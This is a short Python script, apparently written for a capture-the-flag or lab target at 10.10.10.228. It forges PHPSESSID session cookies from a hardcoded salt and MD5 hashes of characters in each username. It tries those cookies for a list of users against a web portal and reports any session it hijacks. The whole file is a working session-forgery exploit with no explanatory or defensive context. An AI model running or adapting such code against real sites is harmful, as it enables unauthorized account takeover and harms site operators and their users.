#!/usr/bin/env python3

import hashlib
import requests

users = "alex,paul,jack,olivia,john,emma,william,lucas,sirine,juliette,support".split(",")

for user in users:
    print(f"\r[*] Trying cookies for {user}" + 20*" ", end="", flush=True)
    for c in user:
        h = hashlib.md5(f"s4lTy_stR1nG_{c}(!528./9890".encode('utf-8')).hexdigest()
        cookie = f"{user}{h}"
        resp = requests.get('http://10.10.10.228/portal/index.php', cookies={"PHPSESSID": cookie})
        if user in resp.text.lower():
            print(f"\r[+] Found cookie for {user}: {cookie}")
print("\r" + 40*" ")
